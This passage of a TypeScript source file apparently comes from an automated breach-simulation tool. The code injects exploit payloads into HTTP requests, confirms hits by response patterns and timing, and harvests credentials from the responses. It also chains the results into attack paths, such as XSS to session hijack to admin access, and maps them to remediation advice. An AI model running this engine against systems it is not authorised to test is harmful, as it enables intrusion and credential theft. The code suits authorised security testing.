        timestamp: requestTimestamp,
        durationMs,
      };

    } catch {
      return null;
    }
  }

  /**
   * Build the HTTP request config for a given exploit payload.
   */
  private buildExploitRequest(endpoint: DiscoveredEndpoint, payload: ExploitPayload): AxiosRequestConfig {
    const config: AxiosRequestConfig = {
      method: endpoint.method,
      url: endpoint.url,
      headers: { ...endpoint.headers },
    };

    switch (payload.location) {
      case 'query': {
        const url = new URL(endpoint.url, this.target.baseUrl);
        url.searchParams.set(payload.parameter, payload.payload);
        config.url = url.pathname + url.search;
        break;
      }
      case 'body': {
        config.method = endpoint.method === 'GET' ? 'POST' : endpoint.method;
        if (endpoint.contentType?.includes('json') || !endpoint.contentType) {
          config.headers!['Content-Type'] = 'application/json';
          try {
            const parsed = JSON.parse(payload.payload);
            config.data = parsed;
          } catch {
            config.data = { [payload.parameter]: payload.payload };
          }
        } else {
          config.headers!['Content-Type'] = 'application/x-www-form-urlencoded';
          config.data = `${encodeURIComponent(payload.parameter)}=${encodeURIComponent(payload.payload)}`;
        }
        break;
      }
      case 'path': {
        config.url = endpoint.url.replace(
          new RegExp(`(${payload.parameter}|\\d+)(?=/|$)`),
          encodeURIComponent(payload.payload)
        );
        // If no substitution happened, append
        if (config.url === endpoint.url) {
          config.url = endpoint.url + '/' + encodeURIComponent(payload.payload);
        }
        break;
      }
      case 'header': {
        const [headerName, headerValue] = payload.payload.includes(':')
          ? payload.payload.split(':', 2).map(s => s.trim())
          : [payload.parameter, payload.payload];
        config.headers![headerName] = headerValue;
        break;
      }
      case 'cookie': {
        const existing = (config.headers!['Cookie'] as string) || '';
        config.headers!['Cookie'] = `${existing}; ${payload.parameter}=${payload.payload}`;
        break;
      }
    }

    return config;
  }

  /**
   * Validate whether an exploit was successful based on response analysis.
   */
  private validateExploit(
    payload: ExploitPayload,
    response: CapturedResponse,
    durationMs: number
  ): {
    confirmed: boolean;
    confidence: number;
    evidenceType: ExploitEvidence['type'];
    description: string;
    matchedPatterns: string[];
    extractedData: string[];
  } {
    const matchedPatterns: string[] = [];
    const extractedData: string[] = [];
    let confidence = 0;
    let evidenceType: ExploitEvidence['type'] = 'response_match';

    const body = response.body;

    // Check success patterns
    for (const pattern of payload.detection.successPatterns) {
      const match = body.match(pattern);
      if (match) {
        matchedPatterns.push(match[0]);
        confidence += 0.3;
      }
    }

    // Check status codes
    if (payload.detection.successCodes?.includes(response.statusCode)) {
      confidence += 0.1;
    }

    // Check timing (for blind injection)
    if (payload.detection.timingThreshold && durationMs >= payload.detection.timingThreshold) {
      confidence += 0.5;
      evidenceType = 'timing';
      matchedPatterns.push(`Response time: ${durationMs}ms (threshold: ${payload.detection.timingThreshold}ms)`);
    }

    // Check data leak patterns
    if (payload.detection.dataLeakPatterns) {
      for (const pattern of payload.detection.dataLeakPatterns) {
        const matches = body.match(pattern);
        if (matches) {
          extractedData.push(...matches.slice(0, 5));
          confidence += 0.2;
          evidenceType = 'data_leak';
        }
      }
    }

    // Check for error disclosure (bonus signal)
    const errorPatterns = [
      /stack.*trace/i, /traceback/i, /exception/i, /error.*at.*line/i,
      /debug.*mode/i, /internal server error/i
    ];
    for (const pattern of errorPatterns) {
      if (pattern.test(body)) {
        if (matchedPatterns.length > 0) confidence += 0.1;
        if (evidenceType === 'response_match' && confidence > 0) evidenceType = 'error_disclosure';
      }
    }

    // Cap confidence at 1.0
    confidence = Math.min(1.0, confidence);

    // Threshold: need at least 0.3 confidence for validation
    const confirmed = confidence >= 0.3;

    const description = confirmed
      ? `${payload.name} confirmed on ${payload.parameter} — ${matchedPatterns.length} pattern matches, ${extractedData.length} data items extracted`
      : `${payload.name} not confirmed (confidence: ${(confidence * 100).toFixed(0)}%)`;

    return { confirmed, confidence, evidenceType, description, matchedPatterns, extractedData };
  }


  // ═════════════════════════════════════════════════════════════════════
  // Phase D: Credential Harvesting (from real responses)
  // ═════════════════════════════════════════════════════════════════════

  private harvestCredentials(): void {
    const validated = this.attempts.filter(a => a.validated);

    for (const attempt of validated) {
      const body = attempt.response.body;

      for (const pattern of CREDENTIAL_PATTERNS) {
        const matches = Array.from(body.matchAll(pattern.pattern));
        for (const match of matches) {
          const value = match[1] || match[0];
          const hash = crypto.createHash('sha256').update(value).digest('hex');

          // Deduplicate
          if (!this.credentials.find(c => c.hash === hash)) {
            this.credentials.push({
              type: pattern.type,
              value: this.maskCredential(value),
              context: `Extracted from ${attempt.endpoint.url} via ${attempt.payload.name}`,
              source: attempt.payload.id,
              hash,
              accessLevel: pattern.accessLevel,
            });
          }
        }
      }
    }
  }

  /** Mask credential values for safe storage — keep first/last 4 chars */
  private maskCredential(value: string): string {
    if (value.length <= 8) return value.substring(0, 2) + '***';
    return value.substring(0, 4) + '***' + value.substring(value.length - 4);
  }


  // ═════════════════════════════════════════════════════════════════════
  // Phase E: Attack Path Assembly
  // ═════════════════════════════════════════════════════════════════════

  private buildAttackPaths(): DiscoveredAttackPath[] {
    const validated = this.attempts.filter(a => a.validated);
    if (validated.length === 0) return [];

    const paths: DiscoveredAttackPath[] = [];

    // Group validated exploits by severity and chain potential
    const criticals = validated.filter(a => a.payload.severity === 'critical');
    const withCreds = validated.filter(a => a.evidence.extractedData && a.evidence.extractedData.length > 0);

    // Path 1: Direct critical exploit → credential → access
    for (const exploit of criticals) {
      const credentialStep = withCreds.find(w => w.endpoint.url === exploit.endpoint.url);
      const steps: AttackPathStep[] = [
        {
          order: 1,
          action: `Exploit ${exploit.payload.type} on ${exploit.endpoint.url}`,
          technique: exploit.payload.name,
          mitreId: exploit.payload.mitreId,
          evidence: exploit.evidence.curlCommand,
        }
      ];

      if (credentialStep && credentialStep.evidence.extractedData) {
        steps.push({
          order: 2,
          action: 'Extract credentials from exploit response',
          technique: 'Credential Harvesting',
          mitreId: 'T1555',
          evidence: `${credentialStep.evidence.extractedData.length} credentials extracted`,
          credentialsGained: credentialStep.evidence.extractedData.slice(0, 3),
        });
      }

      // If we got creds, project escalation
      const relevantCreds = this.credentials.filter(c => c.source === exploit.payload.id);
      if (relevantCreds.length > 0) {
        const hasDbCred = relevantCreds.some(c => c.type === 'connection_string' || c.type === 'database');
        const hasCloudCred = relevantCreds.some(c => c.type === 'cloud_credential');

        if (hasDbCred) {
          steps.push({
            order: steps.length + 1,
            action: 'Access database with harvested credentials',
            technique: 'Database Access via Compromised Credentials',
            mitreId: 'T1078',
            evidence: 'Database connection string extracted from exploit',
            credentialsUsed: ['database_credential'],
          });
        }

        if (hasCloudCred) {
          steps.push({
            order: steps.length + 1,
            action: 'Authenticate to cloud provider with extracted keys',
            technique: 'Cloud IAM Credential Abuse',
            mitreId: 'T1078.004',
            evidence: 'AWS access key extracted from exploit response',
            credentialsUsed: ['cloud_credential'],
          });
        }
      }

      paths.push({
        id: crypto.randomUUID(),
        name: `${exploit.payload.type.toUpperCase()} → ${steps[steps.length - 1].action.substring(0, 50)}`,
        steps,
        entryPoint: exploit.endpoint.url,
        finalImpact: this.assessImpact(exploit, relevantCreds),
        riskScore: this.calculatePathRisk(exploit, relevantCreds),
        mitreTactics: Array.from(new Set(steps.map(s => s.mitreId))),
      });
    }

    // Path 2: Chained exploits (e.g., XSS → session hijack → admin access)
    const xssExploits = validated.filter(a => a.payload.type === 'xss');
    const authBypass = validated.filter(a => a.payload.type === 'auth_bypass');

    if (xssExploits.length > 0 && authBypass.length > 0) {
      paths.push({
        id: crypto.randomUUID(),
        name: 'XSS → Session Hijack → Admin Access',
        steps: [
          {
            order: 1,
            action: `Execute XSS on ${xssExploits[0].endpoint.url}`,
            technique: xssExploits[0].payload.name,
            mitreId: 'T1189',
            evidence: xssExploits[0].evidence.curlCommand,
          },
          {
            order: 2,
            action: 'Steal admin session cookie via XSS',
            technique: 'Session Hijacking',
            mitreId: 'T1539',
            evidence: 'XSS payload accesses document.cookie',
            credentialsGained: ['session_cookie'],
          },
          {
            order: 3,
            action: `Access admin panel at ${authBypass[0].endpoint.url}`,
            technique: 'Privilege Escalation via Stolen Session',
            mitreId: 'T1078',
            evidence: authBypass[0].evidence.curlCommand,
            credentialsUsed: ['session_cookie'],
          }
        ],
        entryPoint: xssExploits[0].endpoint.url,
        finalImpact: 'Full administrative access to application',
        riskScore: 95,
        mitreTactics: ['T1189', 'T1539', 'T1078'],
      });
    }

    return paths;
  }

  private assessImpact(exploit: ExploitAttempt, creds: HarvestedCredential[]): string {
    if (creds.some(c => c.type === 'cloud_credential')) {
      return 'Cloud infrastructure compromise — potential full organizational breach';
    }
    if (creds.some(c => c.type === 'connection_string')) {
      return 'Database compromise — potential data exfiltration of all application data';
    }
    if (creds.some(c => c.accessLevel === 'admin')) {
      return 'Administrative credential exposure — full application takeover';
    }
    if (exploit.payload.severity === 'critical') {
      return 'Critical vulnerability validated — direct exploitation path confirmed';
    }
    return 'Validated security finding with confirmed impact';
  }

  private calculatePathRisk(exploit: ExploitAttempt, creds: HarvestedCredential[]): number {
    let score = 0;

    // Base score from exploit severity
    switch (exploit.payload.severity) {
      case 'critical': score += 40; break;
      case 'high': score += 25; break;
      case 'medium': score += 15; break;
      case 'low': score += 5; break;
    }

    // Confidence boost
    score += exploit.confidence * 20;

    // Credential multiplier
    score += Math.min(30, creds.length * 10);

    // Admin credential bonus
    if (creds.some(c => c.accessLevel === 'admin')) score += 10;

    return Math.min(100, score);
  }


  // ═════════════════════════════════════════════════════════════════════
  // Helpers
  // ═════════════════════════════════════════════════════════════════════

  private async makeRequest(config: AxiosRequestConfig): Promise<AxiosResponse> {
    this.requestCount++;
    return this.client.request(config);
  }

  private progress(phase: string, progress: number, detail: string): void {
    this.onProgress?.(`active-exploit:${phase}`, progress, detail);
  }

  private isExcluded(path: string): boolean {
    const excludes = this.target.scope.excludePaths || [];
    return excludes.some(pattern => new RegExp(pattern).test(path));
  }

  private detectTechnologies(resp: AxiosResponse, techs: Set<string>): void {
    const headers = resp.headers;
    if (headers['x-powered-by']) techs.add(headers['x-powered-by']);
    if (headers['server']) techs.add(headers['server']);
    if (headers['x-aspnet-version']) techs.add('ASP.NET');
    if (headers['x-drupal-cache']) techs.add('Drupal');

    const body = typeof resp.data === 'string' ? resp.data : '';
    if (body.includes('wp-content')) techs.add('WordPress');
    if (body.includes('__next')) techs.add('Next.js');
    if (body.includes('_nuxt')) techs.add('Nuxt.js');
    if (body.includes('csrfmiddlewaretoken')) techs.add('Django');
    if (headers['x-request-id'] && body.includes('express')) techs.add('Express.js');
  }

  private extractLinks(html: string, basePath: string): string[] {
    const links: string[] = [];
    try {
      const $ = cheerio.load(html);
      $('a[href]').each((_, el) => {
        const href = $(el).attr('href');
        if (href && !href.startsWith('http') && !href.startsWith('//') && !href.startsWith('#') && !href.startsWith('mailto:')) {
          const resolved = href.startsWith('/') ? href : `${basePath.replace(/\/[^/]*$/, '')}/${href}`;
          links.push(resolved.split('?')[0].split('#')[0]);
        }
      });
    } catch { /* malformed HTML */ }
    return Array.from(new Set(links));
  }

  private extractFormEndpoints(html: string, basePath: string): DiscoveredEndpoint[] {
    const endpoints: DiscoveredEndpoint[] = [];
    try {
      const $ = cheerio.load(html);
      $('form').each((_, el) => {
        const action = $(el).attr('action') || basePath;
        const method = ($(el).attr('method') || 'POST').toUpperCase() as 'POST' | 'GET';
        const params: DiscoveredParameter[] = [];

        $(el).find('input, textarea, select').each((_, input) => {
          const name = $(input).attr('name');
          if (name) {
            params.push({
              name,
              location: method === 'GET' ? 'query' : 'body',
              type: 'string',
              sampleValue: $(input).attr('value'),
              required: $(input).attr('required') !== undefined,
            });
          }
        });

        if (params.length > 0) {
          endpoints.push({
            url: action.startsWith('/') ? action : `${basePath.replace(/\/[^/]*$/, '')}/${action}`,
            method,
            parameters: params,
            headers: {},
            authenticated: false,
            contentType: 'application/x-www-form-urlencoded',
          });
        }
      });
    } catch { /* malformed HTML */ }
    return endpoints;
  }

  private buildEndpointFromResponse(path: string, method: string, resp: AxiosResponse): DiscoveredEndpoint | null {
    if (resp.status >= 500) return null;

    const params: DiscoveredParameter[] = [];

    // Extract query params from URL
    try {
      const url = new URL(path, 'http://placeholder');
      url.searchParams.forEach((value, key) => {
        params.push({
          name: key,
          location: 'query',
          type: isNaN(Number(value)) ? 'string' : 'number',
          sampleValue: value,
          required: false,
        });
      });
    } catch { /* not a valid URL with params */ }

    // If response is JSON, detect keys as potential parameters
    if (typeof resp.data === 'object' && resp.data !== null) {
      for (const key of Object.keys(resp.data).slice(0, 20)) {
        params.push({
          name: key,
          location: 'body',
          type: typeof resp.data[key] as any || 'unknown',
          sampleValue: String(resp.data[key]).substring(0, 100),
          required: false,
        });
      }
    }

    return {
      url: path.split('?')[0],
      method: method as any,
      parameters: params,
      headers: {},
      authenticated: resp.status === 401 || resp.status === 403,
      contentType: resp.headers['content-type'],
      responseCode: resp.status,
    };
  }

  private buildEndpointFromSpec(path: string, method: string, spec: any): DiscoveredEndpoint | null {
    const params: DiscoveredParameter[] = [];

    // Path parameters
    const pathParams = path.match(/\{(\w+)\}/g) || [];
    for (const p of pathParams) {
      params.push({
        name: p.replace(/[{}]/g, ''),
        location: 'path',
        type: 'string',
        required: true,
      });
    }

    // Query/body parameters from spec
    if (spec.parameters) {
      for (const p of spec.parameters) {
        params.push({
          name: p.name,
          location: p.in || 'query',
          type: p.schema?.type || 'string',
          required: p.required || false,
        });
      }
    }

    // Request body from spec
    if (spec.requestBody?.content?.['application/json']?.schema?.properties) {
      for (const [name, prop] of Object.entries(spec.requestBody.content['application/json'].schema.properties as Record<string, any>)) {
        params.push({
          name,
          location: 'body',
          type: prop.type || 'string',
          required: (spec.requestBody.content['application/json'].schema.required || []).includes(name),
        });
      }
    }

    return {
      url: path,
      method: method as any,
      parameters: params,
      headers: {},
      authenticated: !!(spec.security && spec.security.length > 0),
      contentType: 'application/json',
    };
  }

  private buildCurlCommand(req: CapturedRequest): string {
    let cmd = `curl -X ${req.method} '${req.url}'`;
    for (const [key, value] of Object.entries(req.headers)) {
      if (key.toLowerCase() !== 'user-agent') {
        cmd += ` \\\n  -H '${key}: ${value}'`;
      }
    }
    if (req.body) {
      cmd += ` \\\n  -d '${req.body.substring(0, 500)}'`;
    }
    return cmd;
  }

  private buildResult(
    crawl: CrawlResult,
    startTime: Date,
    attackPaths?: DiscoveredAttackPath[]
  ): ActiveExploitResult {
    const endTime = new Date();
    const validated = this.attempts.filter(a => a.validated);
    const paths = attackPaths || [];

    const exposureTypes: Record<string, number> = {};
    for (const attempt of validated) {
      exposureTypes[attempt.payload.type] = (exposureTypes[attempt.payload.type] || 0) + 1;
    }

    return {
      target: this.target,
      crawl,
      attempts: this.attempts,
      validated,
      credentials: this.credentials,
      attackPaths: paths,
      summary: {
        totalEndpoints: crawl.endpoints.length,
        totalAttempts: this.attempts.length,
        totalValidated: validated.length,
        totalCredentials: this.credentials.length,
        criticalFindings: validated.filter(a => a.payload.severity === 'critical').length,
        highFindings: validated.filter(a => a.payload.severity === 'high').length,
        attackPathsFound: paths.length,
        exposureTypes: exposureTypes as any,
        successRate: this.attempts.length > 0 ? validated.length / this.attempts.length : 0,
      },
      startTime: startTime.toISOString(),
      endTime: endTime.toISOString(),
      durationMs: endTime.getTime() - startTime.getTime(),
    };
  }
}


// ═══════════════════════════════════════════════════════════════════════════════
// Breach Orchestrator Integration Bridge
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Converts ActiveExploitResult into the format expected by the breach orchestrator.
 * This bridges the active exploit engine output into the existing BreachPhaseContext.
 *
 * Call this from `executeApplicationCompromise()` in breach-orchestrator.ts
 */
export function mapToBreachPhaseContext(result: ActiveExploitResult): {
  credentials: Array<{
    type: string;
    value: string;
    source: string;
    hash: string;
    accessLevel: string;
  }>;
  compromisedAssets: Array<{
    assetId: string;
    accessLevel: string;
    exploitUsed: string;
    evidence: string;
  }>;
  attackPathSteps: Array<{
    phase: string;
    action: string;
    technique: string;
    mitreId: string;
    evidence: string;
    timestamp: string;
  }>;
  findings: Array<{
    title: string;
    description: string;
    severity: string;
    cwe: string;
    evidence: string;
    exploitChain: string;
    remediation: string;
    confidence: number;
    curlCommand: string;
  }>;
  riskScore: number;
} {
  // Map credentials
  const credentials = result.credentials.map(c => ({
    type: c.type,
    value: c.value,
    source: c.context,
    hash: c.hash,
    accessLevel: c.accessLevel,
  }));

  // Map compromised assets
  const compromisedAssets = result.validated.map(v => ({
    assetId: result.target.assetId,
    accessLevel: v.payload.severity === 'critical' ? 'admin' : 'user',
    exploitUsed: v.payload.name,
    evidence: v.evidence.curlCommand,
  }));

  // Map attack path steps
  const attackPathSteps = result.attackPaths.flatMap(path =>
    path.steps.map(step => ({
      phase: 'application_compromise',
      action: step.action,
      technique: step.technique,
      mitreId: step.mitreId,
      evidence: step.evidence,
      timestamp: new Date().toISOString(),
    }))
  );

  // Map findings (for DB storage and AI pipeline continuation)
  const findings = result.validated.map(v => ({
    title: `[VALIDATED] ${v.payload.name}`,
    description: `Active exploitation confirmed ${v.payload.type} vulnerability on ${v.endpoint.url} parameter ${v.payload.parameter}. ` +
      `Confidence: ${(v.confidence * 100).toFixed(0)}%. Response time: ${v.durationMs}ms. ` +
      `${v.evidence.matchedPatterns.length} detection patterns matched.`,
    severity: v.payload.severity,
    cwe: v.payload.cwe,
    evidence: v.evidence.description,
    exploitChain: `${v.endpoint.method} ${v.endpoint.url} → ${v.payload.name} → ${v.evidence.type}`,
    remediation: getRemediation(v.payload.type),
    confidence: v.confidence,
    curlCommand: v.evidence.curlCommand,
  }));

  // Overall risk score
  const riskScore = Math.min(100,
    result.summary.criticalFindings * 25 +
    result.summary.highFindings * 15 +
    result.summary.totalCredentials * 10 +
    result.summary.attackPathsFound * 20
  );

  return { credentials, compromisedAssets, attackPathSteps, findings, riskScore };
}

function getRemediation(type: ExposureType): string {
  const remediations: Record<ExposureType, string> = {
    sqli: 'Use parameterized queries/prepared statements. Never concatenate user input into SQL. Apply ORM-level query building. Deploy WAF rules for SQL injection patterns.',
    xss: 'Encode all user output contextually (HTML, JS, URL, CSS). Implement Content-Security-Policy headers. Use framework auto-escaping. Sanitize with DOMPurify for rich text.',
    ssrf: 'Validate and whitelist allowed URLs/domains. Block requests to internal IP ranges (169.254.x.x, 10.x.x.x, 127.x.x.x). Use network-level controls. Disable unnecessary URL schemes.',
    auth_bypass: 'Implement proper authentication checks on all endpoints. Use centralized auth middleware. Validate JWTs server-side with strong algorithms. Rotate default credentials.',
    idor: 'Implement object-level authorization checks. Use indirect references (UUIDs) instead of sequential IDs. Validate resource ownership on every request.',
    path_traversal: 'Validate and canonicalize file paths. Use allowlists for accessible files. Chroot file access. Never use raw user input in file operations.',
    command_injection: 'Never pass user input to shell commands. Use language-native APIs instead of shell exec. If unavoidable, use strict allowlists and escape all input.',
    jwt_abuse: 'Use strong signing keys (256+ bit). Validate algorithm server-side (reject "none"). Implement proper key rotation. Use asymmetric algorithms (RS256/ES256).',
    api_abuse: 'Implement rate limiting per user/IP. Validate request schemas strictly. Use allowlists for updatable fields. Disable introspection in production.',
    business_logic: 'Validate business rules server-side. Implement workflow state machines. Add integrity checks for financial calculations. Log and alert on anomalous patterns.',
  };
  return remediations[type] || 'Review and remediate according to OWASP guidelines for this vulnerability class.';
}


// ═══════════════════════════════════════════════════════════════════════════════
// Convenience: Run active exploit engine as a standalone call
// ═══════════════════════════════════════════════════════════════════════════════

export async function runActiveExploitEngine(
  target: ActiveExploitTarget,
  onProgress?: ExploitProgressCallback
): Promise<ActiveExploitResult> {
  const engine = new ActiveExploitEngine(target, onProgress);
  return engine.run();
}
